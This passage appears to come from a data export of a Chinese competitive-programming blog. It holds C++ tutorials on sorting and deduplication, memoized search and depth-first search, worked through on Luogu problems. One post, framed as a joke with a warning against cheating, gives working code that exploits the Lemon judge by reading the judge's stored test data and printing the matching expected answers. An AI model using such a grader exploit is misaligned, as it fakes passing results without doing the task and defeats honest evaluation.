a + n + 1); int len = unique(a + 1, a + n + 1) - a - 1; // 再次排序（按照输入顺序） sort(a + 1, a + len + 1, cmp); // 输出 for(int i = 1; i &lt;= len; i++){ cout &lt;&lt; a[i].num &lt;&lt; &quot; &quot;; } 美滋滋写完，发现编译器报错： [Error] no match for 'operator==' (operand types are 'node' and 'node') [Error] no match for 'operator&lt;' (operand types are 'node' and 'node') 为啥？咋嘛咋嘛滋味儿，我突然发现结构体有两个变量。 电脑和 unique 函数咋知道我要比较哪个？ 好的，它不知道，那咱们帮它知道。一拳头淦电脑上。 通过重载运算符： struct node { int num, id; bool operator == (node k){ // 判等，判的是储存的数等 return num == k.num; } bool operator &lt; (node k){ // 排序，让数小的在前面，让输入编号小的在前 return num &lt; k.num || num == k.num &amp;&amp; id &lt; k.id; } } a[INF]; 如果有更多的结构体成员也没关系，核心就是两次排序和重载运算符。 现在就可以实现不排序的去重了。 题 Luogu P3370\\texttt{Luogu P3370}Luogu P3370【模板】字符串哈希 很简单的水了一道题。（喜） // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; const int INF = 1e4 + 1; set &lt;string&gt; s; int main(){ ios :: sync_with_stdio(false); int n; cin &gt;&gt; n; while(n--){ string str; cin &gt;&gt; str; s.insert(str); } cout &lt;&lt; s.size(); return 0; } ","tags":[{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"C++ 排序和去重","feature":"https://daoxi365.github.io/tech-blog//post-images/c-pai-xu-he-qu-chong.png","link":"https://daoxi365.github.io/tech-blog/c-pai-xu-he-qu-chong/","stats":{"text":"8 min read","time":444000,"words":1640,"minutes":8},"date":"2023-09-15 19:00:32","dateFormat":"2023-09-15"},{"content":"众所周知，贪心是从局部最优解推算到全局最优解。 那么 dp\\texttt{dp}dp（动态规划）就是枚举出来每一种情况找到最优解。 但是有的时候，初学者无法轻易地推出来递推（状态转移）方程。 我们就容易想到，深搜 DFS\\texttt{DFS}DFS 同样可以枚举出来每一种结果， 但是，同一个状态会访问多次，时间复杂度呈指数形，大多数情况是 TLE\\texttt{TLE}TLE。 今天我介绍一种方式优化上文所述的算法——记忆化搜索。 它可以保证每一个状态只访问一次，基本上与递推同样快。 至少在普及组里可以替代动态规划。 我个人觉得，记忆化的思路、实现远比推方程式简单。 结合例题，来看看如何实现。 【Luogu P1002 / NOIp 2002 PJ\\texttt{Luogu P1002 / NOIp 2002 PJ}Luogu P1002 / NOIp 2002 PJ 过河卒】 dp\\texttt{dp}dp 做法 记忆化搜索 【Luogu P1216 / USACO1.5 / IOI 1994\\texttt{Luogu P1216 / USACO1.5 / IOI 1994}Luogu P1216 / USACO1.5 / IOI 1994 数字三角形】 dp\\texttt{dp}dp 做法 记忆化搜索 【Luogu P1855\\texttt{Luogu P1855}Luogu P1855 榨取 kkksc03\\texttt{kkksc03}kkksc03】 【Luogu P5017 / NOIp 2018 PJ【\\texttt{Luogu P5017 / NOIp 2018 PJ}【Luogu P5017 / NOIp 2018 PJ 摆渡车】 【Luogu P1002 / NOIp 2002 PJ\\texttt{Luogu P1002 / NOIp 2002 PJ}Luogu P1002 / NOIp 2002 PJ 过河卒】 dp\\texttt{dp}dp 做法 我们知道卒行走的规则是向下或向右，所以一个卒来的方向，要么从上面来，要么从左边来。 令 fi,jf_{i,j}fi,j​ 表示卒可以走到 (i,j)(i,j)(i,j) 的路径条数。 我们可以列出方程： fi,j=fi−1,j+fi,j−1(ai,j=1)fi,j=ai,j−1(i=0)fi,j=ai−1,j(j=0)f_{i,j} = f_{i-1,j} + f_{i,j-1} (a_{i,j}=1)\\\\ f_{i,j} = a_{i,j-1} (i = 0)\\\\ f_{i,j} = a_{i-1,j} (j = 0)\\\\ fi,j​=fi−1,j​+fi,j−1​(ai,j​=1)fi,j​=ai,j−1​(i=0)fi,j​=ai−1,j​(j=0) 程序也很好实现： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; const int INF = 51; ll n, m, cx, cy, a[INF][INF], // a[i][j]: 能从多少条路径走到 (i, j) // 八面威风 fx[9] = {0, -2, 2, -1, 1, 1, -1, 2, -2}, fy[9] = {0, -1, -1, -2, -2, 2, 2, 1, 1}; int main(){ ios :: sync_with_stdio(0); cin &gt;&gt; n &gt;&gt; m &gt;&gt; cx &gt;&gt; cy; for(int i=0; i&lt;=n; i++){ for(int j=0; j&lt;=m; j++){ a[i][j] = 1; } } for(int i=0; i&lt;=8; i++){ // 马可以走到的位置，卒不能走，特殊标记 if(cx+fx[i]&gt;=0 &amp;&amp; cx+fx[i]&lt;=n &amp;&amp; cy+fy[i]&gt;=0 &amp;&amp; cy+fy[i]&lt;=m){ a[cx + fx[i]][cy + fy[i]] = 0; } } for(int i=0; i&lt;=n; i++){ for(int j=0; j&lt;=m; j++){ // 枚举每一个位置 if(!a[i][j] || i==0 &amp;&amp; j==0) continue; else if(i == 0) a[i][j] = a[i][j-1]; else if(j == 0) a[i][j] = a[i-1][j]; else a[i][j] = a[i-1][j] + a[i][j-1]; } } cout &lt;&lt; a[n][m]; return 0; } 记忆化搜索 显然，直接搜索肯定会爆炸。我写了暴力 BFS &amp; DFS\\texttt{BFS \\&amp; DFS}BFS &amp; DFS，都只有 404040 分。 暴力 DFS\\texttt{DFS}DFS 做法： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; const int INF = 21; bool vis[INF][INF]; int n, m, x, y, ans, fx[3] = {0, 0, 1}, fy[3] = {0, 1, 0}, mx[9] = {0, -2, 2, -1, 1, 1, -1, 2, -2}, my[9] = {0, -1, -1, -2, -2, 2, 2, 1, 1}; bool check(int xx, int yy){ return xx &gt;= 0 &amp;&amp; xx &lt;= n &amp;&amp; yy &gt;= 0 &amp;&amp; yy &lt;= m; } void dfs(int x, int y){ if(x == n &amp;&amp; y == m){ ans++; return; } for(int i = 1; i &lt;= 2; i++){ int xx = x + fx[i], yy = y + fy[i]; if(check(xx, yy) &amp;&amp; !vis[xx][yy]){ dfs(xx, yy); } } } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n &gt;&gt; m &gt;&gt; x &gt;&gt; y; for(int i = 0; i &lt;= 8; i++){ int xx = x + mx[i], yy = y + my[i]; if(check(xx, yy)){ vis[xx][yy] = true; } } dfs(0, 0); cout &lt;&lt; ans; return 0; } 于是我在深搜基础上加了个记忆化： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; // 懒人方法 #define int long long const int INF = 21; bool vis[INF][INF]; // vis[i][j]: 记录是否访问过 (i, j) int n, m, x, y, f[INF][INF], // f[i][j]: 记忆化数组，从 (i, j) 可以有多少条路线到达终点 fx[3] = {0, 0, 1}, fy[3] = {0, 1, 0}, // 卒行走规则 mx[9] = {0, -2, 2, -1, 1, 1, -1, 2, -2}, // 马行走规则 my[9] = {0, -1, -1, -2, -2, 2, 2, 1, 1}; bool check(int xx, int yy){ // 判断是否越界 return xx &gt;= 0 &amp;&amp; xx &lt;= n &amp;&amp; yy &gt;= 0 &amp;&amp; yy &lt;= m; } int dfs(int x, int y){ if(x == n &amp;&amp; y == m) return f[x][y] = 1; // 到达终点了 if(f[x][y] != -1) return f[x][y]; // 当前已经访问过了，直接输出当时访问的结果 int sum = 0; for(int i = 1; i &lt;= 2; i++){ int xx = x + fx[i], yy = y + fy[i]; if(check(xx, yy) &amp;&amp; !vis[xx][yy]){ sum += dfs(xx, yy); } if(vis[xx][yy]) f[xx][yy] = 0; // 这里不能走或者走过了，标记为 0 } return f[x][y] = sum; // 保存当前结果 } signed main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n &gt;&gt; m &gt;&gt; x &gt;&gt; y; memset(f, -1, sizeof(f)); // 初始化记忆化数组 for(int i = 0; i &lt;= 8; i++){ int xx = x + mx[i], yy = y + my[i]; if(check(xx, yy)){ vis[xx][yy] = true; f[xx][yy] = 114514; // 标记不能走 } } cout &lt;&lt; dfs(0, 0); return 0; } 甚至跑的比 dp\\texttt{dp}dp 快！（大喜） 【Luogu P1216 / USACO1.5 / IOI 1994\\texttt{Luogu P1216 / USACO1.5 / IOI 1994}Luogu P1216 / USACO1.5 / IOI 1994 数字三角形】 此题堪称经典，是 dp\\texttt{dp}dp 或递推的板子。 dp\\texttt{dp}dp 做法 对于每一个数字的位置 (i,j)(i,j)(i,j)，都可以从 (i−1,j)(i-1,j)(i−1,j) 或 i−1,j−1i-1, j-1i−1,j−1 的位置加下来。 从数字三角形的最上方顶点开始加，每次都加最大的，最后底边上的最大值就是答案。 也可以从底边的每一个数往上加，同理。方程： fi,j=max{fi+1,j,fi+1,j+1}+ai,jans=max{fn}f_{i,j} = max\\{f_{i+1,j}, f_{i+1,j+1}\\} + a_{i,j}\\\\ ans=max\\{f_n\\} fi,j​=max{fi+1,j​,fi+1,j+1​}+ai,j​ans=max{fn​} 程序： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; const int INF = 1e3 + 1; int n, a[INF][INF]; int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n; for(int i = 1; i &lt;= n; i++){ for(int j = 1; j &lt;= i; j++){ cin &gt;&gt; a[i][j]; } } for(int i = n-1; i &gt;= 1; i--){ for(int j = 1; j &lt;= i; j++){ a[i][j] += max(a[i+1][j], a[i+1][j+1]); } } cout &lt;&lt; a[1][1]; return 0; } 记忆化搜索 同样，我咔咔咔先打了个暴搜： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; const int INF = 1e3 + 1; int n, ans, a[INF][INF]; int dfs(int i, int j, int st = 0){ if(i == n) return st + a[i][j]; return max(max(dfs(i+1, j, st+a[i][j]), dfs(i+1, j+1, st+a[i][j])), st + a[i][j]); } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n; for(int i = 1; i &lt;= n; i++){ for(int j = 1; j &lt;= i; j++){ cin &gt;&gt; a[i][j]; } } ans = INT_MIN; cout &lt;&lt; dfs(1, 1); return 0; } 一定会超时的，不用试。 所以我加上记忆化： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; const int INF = 1e3 + 1; int n, a[INF][INF], f[INF][INF]; int dfs(int i, int j){ if(f[i][j] != -1) return f[i][j]; // 访问过了 if(i == n) return f[i][j] = a[i][j]; else return f[i][j] = max(dfs(i+1, j), dfs(i+1, j+1)) + a[i][j]; } int main(){ ios :: sync_with_stdio(false); memset(f, -1, sizeof(f)); // 初始化 cin &gt;&gt; n; for(int i = 1; i &lt;= n; i++){ for(int j = 1; j &lt;= i; j++){ cin &gt;&gt; a[i][j]; } } cout &lt;&lt; dfs(1, 1); return 0; } 然后就顺利 Accepted\\color{green}\\texttt{Accepted}Accepted 了。 为什么会比 dp\\texttt{dp}dp 慢呢？ 搜索是一个递归的过程。我们找到最终的结果后，耗时和递推一样。 但是递归还要归回来，这个过程耽误了时间。 【Luogu P1855\\texttt{Luogu P1855}Luogu P1855 榨取 kkksc03\\texttt{kkksc03}kkksc03】 此题很明显是一个背包问题，还是一个多维与 0−10-10−1 的合体。 做这件事的时间和金钱都是体积，站长的时间和金钱是背包的容积。 所以，如果我不想写递推，就： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; const int INF = 201; int n, m, t, f[INF][INF][INF]; struct node {int m, t;} a[INF]; int dfs(int id, int leftM, int leftT){ /* id: 函数应该处理第 id 件事 leftM: 站长还剩下的钱 leftT: 站长还剩下的时间 */ if(id == n + 1) return f[id][leftM][leftT] = 0; // 越界，不存在这件事 if(leftM &lt; 0 || leftT &lt; 0) return -1; // 站长没钱或者没时间了，啥事也做不了了 if(leftM &lt; a[id].m || leftT &lt; a[id].t) return f[id][leftM][leftT] = dfs(id + 1, leftM, leftT); // 剩下的时间和钱不够做这件事，那就看看下一件事 if(f[id][leftM][leftT] != -1) return f[id][leftM][leftT]; // 记忆化 int dfs1 = dfs(id + 1, leftM, leftT), // 不做这个事 dfs2 = dfs(id + 1, leftM - a[id].m, leftT - a[id].t) + 1; // 做了，站长做的事增加一个 return f[id][leftM][leftT] = max(dfs1, dfs2); // 哪个能干最多的事儿 } int main(){ ios :: sync_with_stdio(false); memset(f, -1, sizeof(f)); cin &gt;&gt; n &gt;&gt; m &gt;&gt; t; for(int i = 1; i &lt;= n; i++){ cin &gt;&gt; a[i].m &gt;&gt; a[i].t; } cout &lt;&lt; dfs(1, m, t); // 从第一件事儿开始处理，时间和金钱都是满的 return 0; } 【Luogu P5017 / NOIp 2018 PJ【\\texttt{Luogu P5017 / NOIp 2018 PJ}【Luogu P5017 / NOIp 2018 PJ 摆渡车】 史上最难的一届普及组。 您可以琢磨琢磨程序的写法。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; typedef long long ll; const int INF = 501; int n, m, a[INF], f[INF][INF]; int dfs(int k, int t){ if(k == n + 1) return 0; if(a[k] &gt; t) return dfs(k, a[k]); if(f[k][t-a[k]] != -1) return f[k][t-a[k]]; int tmp = 0, j = k; for(int i = k; i &lt;= n &amp;&amp; a[i] &lt;= t; j = ++i){ tmp += a[i]; } int ans = t * (j-k) - tmp + dfs(j, t+m); for(int i = j; i &lt;= n; i++){ tmp += a[i]; ans = min(ans, (a[i] * (i-k+1) - tmp + dfs(i+1, a[i]+m))); } return f[k][t-a[k]] = ans; } int main(){ ios :: sync_with_stdio(false); memset(f, -1, sizeof(f)); cin &gt;&gt; n &gt;&gt; m; for(int i = 1; i &lt;= n; i++){ cin &gt;&gt; a[i]; } sort(a + 1, a + n + 1); cout &lt;&lt; dfs(1, 0); return 0; } ","tags":[{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"记忆化搜索","feature":"https://daoxi365.github.io/tech-blog//post-images/ji-yi-hua-sou-suo.png","link":"https://daoxi365.github.io/tech-blog/ji-yi-hua-sou-suo/","stats":{"text":"14 min read","time":793000,"words":2534,"minutes":14},"date":"2023-08-28 21:59:34","dateFormat":"2023-08-28"},{"content":"身为一个蒟蒻，想要在模拟赛里面考出一个 AK\\text{AK}AK（痴心妄想），需要借助科技的力量。 于是“自动 AC\\text{AC}AC 机”便应运而生了！ 前排提示：此文章仅供娱乐，请勿在考试中作弊。否则后果自负。 好好学习，天天向上。 “自动 AC\\text{AC}AC 机”的原理就类似于一个大型打表器，但表就是数据。根据输入数据到数据文件夹内逐个匹配输入，再根据输入找出对应的输出，实现 Accept\\text{Accept}Accept 的效果。 这是 Lemon\\text{Lemon}Lemon 评测的一个 BUG\\text{BUG}BUG，亲测通过，只是比 STD\\text{STD}STD 慢了亿点点。对于其他评测软件，作者不保证其准确性。 刚刚我上网搜了一下，基本都是针对题的。有一个版本是智能版的，但是不完全对。 论自动AC机 - AFOer - 博客园 (cnblogs.com) 那么，就让我来展示一下，我的全自动、傻瓜式、超级智能的“自动 AC\\text{AC}AC 机”。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; #include &lt;dirent.h&gt; using namespace std; const int BUFINF = 1e6 + 1, DFINF = 5e2 + 1; bool useStdIO, errors; string errType, dataFile[DFINF]; int getData(string path); string getInput(string path); string getExName(string s); string getInputWithoutMoreEndl(string path); void checkErr(); int main(){ // 请用户填写以下题目信息 useStdIO = false; // 是否使用标准输入输出（true=使用 std，false=使用文件流） string title = &quot;&lt;title&gt;&quot;, // 当前题目名称 iFile = title + &quot;.in&quot;, // 题目要求的输入数据文件（仅当 useStdIO 为真时有效） oFile = title + &quot;.out&quot;, // 题目要求的输出数据文件（仅当 useStdIO 为真时有效） // 请用户不要操作以下内容 problemPath = &quot;../../data/&quot; + title + &quot;/&quot;, oExName = getExName(oFile), inp = &quot;&quot;, conStr; if(useStdIO){ string addStr = &quot;\\n&quot;; #ifdef _WIN32 addStr = &quot;\\r\\n&quot;; #endif while(getline(cin, conStr)) inp += conStr + addStr; inp = inp.substr(0, inp.size() - 1); } else{ inp = getInputWithoutMoreEndl(iFile); freopen(oFile.c_str(), &quot;wb&quot;, stdout); } int dataFileCNT = getData(problemPath); for(int i=1; i&lt;=dataFileCNT; i++){ string exName = getExName(dataFile[i]); if(exName != &quot;.in&quot;) continue; else{ string absPath = problemPath + dataFile[i], curIn = getInputWithoutMoreEndl(absPath); if(curIn == inp){ int pointPOS = dataFile[i].find(&quot;.&quot;); string ansPath = problemPath + dataFile[i].substr(0, pointPOS) + oExName, ans = getInput(ansPath); cout &lt;&lt; ans; return 0; } } } cout &lt;&lt; &quot;Could not find the answer&quot;; return 0; } int getData(string path){ int dataFileCNT = 0; DIR *dirPath = opendir(path.c_str()); if(!dirPath){ errors = true; errType = &quot;Could not reach the folder&quot;; checkErr(); } dirent *dName; while((dName = readdir(dirPath))){ dataFile[++dataFileCNT] = dName -&gt; d_name; if(dataFile[dataFileCNT] == &quot;.&quot; || dataFile[dataFileCNT] == &quot;..&quot;) dataFileCNT--; } closedir(dirPath); return dataFileCNT; } string getInput(string path){ FILE *fp = fopen(path.c_str(), &quot;rb&quot;); if(!fp){ errors = true; errType = &quot;Could not read from the INPUT file&quot;; checkErr(); } char buffer[BUFINF] = {0}; while(!feof(fp)){ fread(buffer, sizeof(buffer), 1, fp); if(feof(fp)) break; } return string(buffer); } string getInputWithoutMoreEndl(string path){ string tmp = getInput(path); int bufferLen = tmp.size() - 1; while(tmp[bufferLen] == '\\n') tmp = tmp.substr(0, bufferLen--); return tmp; } string getExName(string s){ int tmp = s.find(&quot;.&quot;); return s.substr(tmp == -1 ? 0 : tmp); } void checkErr(){ if(errors){ cerr &lt;&lt; errType; exit(0); } return; } ","tags":[{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"},{"index":-1,"name":"整活","slug":"TFA","used":true,"link":"https://daoxi365.github.io/tech-blog/TFA/"}],"title":"基于 Lemon 评测软件的“自动 AC 机”","feature":"https://daoxi365.github.io/tech-blog//post-images/ji-yu-lemon-ping-ce-ruan-jian-de-zi-dong-ac-ji.png","link":"https://daoxi365.github.io/tech-blog/ji-yu-lemon-ping-ce-ruan-jian-de-zi-dong-ac-ji/","stats":{"text":"4 min read","time":208000,"words":703,"minutes":4},"date":"2023-08-02 16:27:42","dateFormat":"2023-08-02"},{"content":"好长时间没有写过这个系列了，中间还进行了文章的大迁移，希望大家还记得我。 那么，我们前面说过，递归是深搜的实现过程。递归是什么来着？ 其实就是自调用的函数。 我们不妨假想：对某个问题的答案进行枚举，要做到不重不漏，有什么办法呢？ 全排列问题 图论中的深搜问题 连通块问题 迷宫问题 记忆化搜索 全排列问题 三个不同的苹果要放到三个不同的盘子里，不能有空盘子。求放法？ 显然，可以列一个表格去做。 方案/盘子 甲 乙 丙 ① AAA 苹果 BBB 苹果 CCC 苹果 ② AAA 苹果 CCC 苹果 BBB 苹果 ③ BBB 苹果 AAA 苹果 CCC 苹果 ④ BBB 苹果 CCC 苹果 AAA 苹果 ⑤ CCC 苹果 AAA 苹果 BBB 苹果 ⑥ CCC 苹果 BBB 苹果 AAA 苹果 综上，共 C33=3!(3−2)!=6C^3_3=\\frac{3!}{(3-2)!}=6C33​=(3−2)!3!​=6 种方案。 对于上面的例子，我们完全可以暴力，程序如下： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; #define endl &quot;\\n&quot; #define ll long long const int INF = 4; // 三个苹果 char pl[INF]; // 盘子里放的什么苹果 map &lt;char, bool&gt; vis; // 标记苹果是否已经放入盘里（只能用一次） int main(){ ios :: sync_with_stdio(false); for(char i='A'; i&lt;='C'; i++){ // 枚举第一个苹果 pl[1] = i; // 记录下第一个盘子放的苹果 i vis[i] = true; // 标记已使用 for(char j='A'; j&lt;='C'; j++){ // 枚举第二个苹果 if(vis[j]) continue; // 如果已经使用过，就跳过 pl[2] = j; vis[j] = true; for(char k='A'; k&lt;='C'; k++){ // 枚举第三个苹果 if(vis[k]) continue; pl[3] = k; vis[k] = true; cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; j &lt;&lt; &quot; &quot; &lt;&lt; k &lt;&lt; endl; // 输出苹果方案 vis[k] = false; } vis[j] = false; // 拿出来苹果，再继续放 } vis[i] = false; } return 0; } 很麻烦，中间很多东西都是来回判断，对不对？ 而且此程序还有一个致命的缺陷，如果有 nnn 个苹果和 nnn 个盘子，就没办法这样一个个写循环了，除非一个个判断（显然不现实）。 对于这个缺陷，我们可以使用递归的思想去作答——该如何考虑呢？ 这，就是经典的深度优先搜索——全排列问题。 DFS\\text{DFS}DFS 全称是 Depth First Search\\text{Depth First Search}Depth First Search，中文名是深度优先搜索，是一种用于遍历或搜索树或图的算法。所谓深度优先，就是说每次都尝试向更深的节点走。——OI Wiki\\text{OI Wiki}OI Wiki 我们可以每次都枚举当前这一步放什么苹果，接着再下一步……知道发现结果。 根据这个原理，我们可以写下一个简单的深搜： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; #define endl &quot;\\n&quot; #define ll long long const int INF = 11; int n; // 多个苹果（A、B、C、D……） char pl[INF]; // 盘子里放的什么苹果 map &lt;char, bool&gt; vis; // 标记苹果是否已经放入盘里（只能用一次） void dfs(int st){ // st 当前该放哪个盘子了 if(st == n+1){ // 若 n 个苹果都枚举到了 for(int i=1; i&lt;=n; i++){ // 输出 cout &lt;&lt; pl[i] &lt;&lt; &quot; \\n&quot;[i == n]; } return; // 边界条件 } for(int i=1; i&lt;=n; i++){ // 一个个地试 char c = 'A' + i - 1; // c 苹果的编号 if(!vis[c]){ // 若当前苹果没被用过 pl[st] = c; // 放进盘子 vis[c] = true; // 标记这个苹果用过了 dfs(st + 1); // 接着枚举下一个盘子的情况 vis[c] = false; // 把苹果拿出来（回溯） } } } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n; dfs(1); // 从第一个苹果开始枚举 return 0; } 一定一定要理解这段程序！！ （等待中） 简单的全排列问题，相信你已经完全理解了吧！ // Author:PanDaoxi // 我承认，当时的码风足够丑……这是我新的码风形成初期写的 #include &lt;bits/stdc++.h&gt; using namespace std; const int inf = 10; int n, use[inf]; bool vis[inf]; // 标记使用过 void dfs(int k){ if(k == n){ // 输出 for(int i=1; i&lt;=n; i++){ printf(&quot;%5d&quot;, use[i]); } printf(&quot;\\n&quot;); return; } for(int i=1; i&lt;=n; i++){ if(!vis[i]){ vis[i] = true; //标记使用过 use[k+1] = i; dfs(k+1); // 递归 // 回溯 vis[i] = false; } } } int main(){ cin &gt;&gt; n; dfs(0); // 开始递归 return 0; } 图论中的深搜问题 我们刚刚说全排列中的深搜，是逐个判断当前这一位的情况是否可行，直到全部填满。 树是一种特殊的图，其特点是一个前驱，多个后继。对于树的储存方法，我们已经讲过，可以通过父亲表示法，也可以通过孩子表示法，用链表存储即可。遍历的方式一共四种：先序遍历（先根遍历，根左右）、中序遍历（左根右）、后序遍历（后根遍历，左右根）、层序遍历（宽度优先搜索 BFS\\text{BFS}BFS）。 那么，我现在给出一个有子权的无向连通图，有四个结点，共六条路径。 从 v0v_0v0​ 走到 v3v_3v3​ 一共有多少不同路径？ 我们首先考虑如何存储图。对于这类问题，可以使用邻接矩阵。即： 可以走的地方写成真，不能走的地方写成假。 ……具体的程序和理解，可以参考这篇文章。图论的知识点，后期会单独开一章来讲。 连通块问题 这道题是很经典的连通块问题。连通块，即上下左右相连的字符。 ——可以用深搜去查看任意的一个 #，在搜索时寻找相同的符号，进入时将其标记为其他东西，并且计数器增加。这种办法，叫做洪水填充法。 最后，如何判断是否为矩形？ 维护一个最小坐标和一个最大坐标，相减后可以得到矩形的长和宽，再判断是否等于当前连通块 # 的总数即可。 完整程序： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; const int inf = 1e3 + 1; int n, m, ans, cnt, maxi, maxj, mini, minj, fx[5] = {0, -1, 1, 0, 0}, fy[5] = {0, 0, 0, -1, 1}; bool a[inf][inf]; void dfs(int x, int y){ maxi = max(x, maxi), maxj = max(y, maxj), mini = min(x, mini), minj = min(y, minj), cnt++, a[x][y] = false; for(int i=1; i&lt;=4; i++){ int xx = x + fx[i], yy = y + fy[i]; if(a[xx][yy] &amp;&amp; xx &gt;= 1 &amp;&amp; x &lt;= n &amp;&amp; yy &gt;= 1 &amp;&amp; yy &lt;= m){ dfs(xx, yy); } } } int main(){ cin &gt;&gt; n &gt;&gt; m; for(int i=1; i&lt;=n; i++){ for(int j=1; j&lt;=m; j++){ char c; cin &gt;&gt; c; a[i][j] = c == '#'; } } for(int i=1; i&lt;=n; i++){ for(int j=1; j&lt;=m; j++){ if(a[i][j]){ cnt = 0, maxi = mini = i, maxj = minj = j; dfs(i, j); if((maxi-mini+1)*(maxj-minj+1) == cnt){ ans++; } else{ printf(&quot;Bad placement.&quot;); return 0; } } } } printf(&quot;There are %d ships.&quot;, ans); return 0; } 高端的应用：染色块。 这道题也是一个连通块。我们该怎么完成呢？ 我们首先应该区分的开闭合圈外和闭合圈内。 我们完全可以按照刚才的方式，计算数量。 很轻松，写出来一段程序： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; #define endl &quot;\\n&quot; #define ll long long const int INF = 501; int n, m, ans, fx[5] = {0, -1, 1, 0, 0}, fy[5] = {0, 0, 0, -1, 1}; char c[INF][INF]; void dfs(int x, int y){ c[x][y] = '*'; for(int i=1; i&lt;=4; i++){ int xx = x + fx[i], yy = y + fy[i]; if(xx&gt;=1 &amp;&amp; xx&lt;=n &amp;&amp; yy&gt;=1 &amp;&amp; yy&lt;=m &amp;&amp; c[xx][yy]=='0'){ dfs(xx, yy); } } } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n &gt;&gt; m; for(int i=1; i&lt;=n; i++){ for(int j=1; j&lt;=m; j++){ cin &gt;&gt; c[i][j]; } } dfs(1, 1); for(int i=1; i&lt;=n; i++){ for(int j=1; j&lt;=m; j++){ if(c[i][j] == '0') ans++; } } cout &lt;&lt; ans; return 0; } 交上去一看： 满江红，听取 WA 声一片。 为什么？错误出在了哪里？ 我们没有考虑到边界前的连通块无法被填充。有一组 Hack\\text{Hack}Hack 数据： 输入： 3 3 **0 *0* 0** 正确的输出： 1 程序的输出： 3 所以，我们需要构造一个连通块，使周围所有都成为一个连通块再填充，就可以填充完整。 这里采用将上下左右的行和列也算进来，构造出一个大闭合圈，填充后，为填充到的部分就是小闭合圈内的安全部分。 正确的程序如下： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; #define endl &quot;\\n&quot; #define ll long long const int INF = 501; int n, m, ans, fx[5] = {0, -1, 1, 0, 0}, fy[5] = {0, 0, 0, -1, 1}; char c[INF][INF]; void dfs(int x, int y){ c[x][y] = '*'; for(int i=1; i&lt;=4; i++){ int xx = x + fx[i], yy = y + fy[i]; if(xx&gt;=0 &amp;&amp; xx&lt;=n+1 &amp;&amp; yy&gt;=0 &amp;&amp; yy&lt;=m+1 &amp;&amp; c[xx][yy]=='0'){ dfs(xx, yy); } } } int main(){ ios :: sync_with_stdio(false); cin &gt;&gt; n &gt;&gt; m; for(int i=0; i&lt;=n+1; i++){ for(int j=0; j&lt;=m+1; j++){ c[i][j] = '0'; if(i&gt;=1 &amp;&amp; i&lt;=n &amp;&amp; j&gt;=1 &amp;&amp; j&lt;=m) cin &gt;&gt; c[i][j]; } } dfs(0, 0); for(int i=0; i&lt;=n+1; i++){ for(int j=0; j&lt;=m+1; j++){ if(c[i][j] == '0') ans++; } } cout &lt;&lt; ans; return 0; } 有一个相似的题目： 正确的程序如下： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; const int INF = 31; int n, a[INF][INF], fx[5] = {0, -1, 1, 0, 0}, fy[5] = {0, 0, 0, -1, 1}; bool vis[INF][INF]; void dfs(int x, int y){ vis[x][y] = true; for(int i=1; i&lt;=4; i++){ int xx = x + fx[i], yy = y + fy[i]; if(xx&gt;=0 &amp;&amp; xx&lt;=n+1 &amp;&amp; yy&gt;=0 &amp;&amp; yy&lt;=n+1 &amp;&amp; !a[xx][yy] &amp;&amp; !vis[xx][yy]) dfs(xx, yy); } } int main(){ ios :: sync_with_stdio(0); cin &gt;&gt; n; for(int i=1; i&lt;=n; i++){ for(int j=1; j&lt;=n; j++){ cin &gt;&gt; a[i][j]; } } dfs(0, 0); for(int i=1; i&lt;=n; i++){ for(int j=1; j&lt;=n; j++){ if(!vis[i][j]){ if(a[i][j] == 1) cout &lt;&lt; 1 &lt;&lt; &quot; &quot;; else cout &lt;&lt; 2 &lt;&lt; &quot; &quot;; } else cout &lt;&lt; 0 &lt;&lt; &quot; &quot;; } cout &lt;&lt; endl; } return 0; } 注意加深理解！！ 迷宫问题 迷宫问题也是深搜的经典问题之一。 根据深搜“不撞南墙不回头”的特点，我们可以让程序像个路痴一样来回跑，能跑到终点就跑到终点，跑到死胡同里再折回来选另一条路。 完全可以遍历到迷宫的每一条路！ 上面的程序是 Python\\text{Python}Python 实现的深搜迷宫问题模拟器，源代码如下： （不重要，不想看的可以直接忽略） （Python\\text{Python}Python 语法糖太多了，且 CCF\\text{CCF}CCF 不认可，所以不用太在意） # Author:PanDaoxi from time import sleep from os import system INF, n, ans = 8, 7, 1 f, fx, fy = [ [0, 0, 0, 0, 0, 0, 0, 0,], [0, 0, 2, 2, 0, 2, 0, 2,], [0, 0, 0, 2, 0, 0, 0, 0,], [0, 2, 0, 2, 2, 2, 2, 0,], [0, 0, 0, 0, 0, 0, 0, 2,], [0, 0, 2, 2, 2, 2, 0, 0,], [0, 0, 0, 0, 0, 0, 2, 0,], [0, 2, 2, 2, 2, 0, 0, 0,], ], [0, -1, 1, 0, 0,], [0, 0, 0, -1, 1] def tprint(i, x, y, xx, 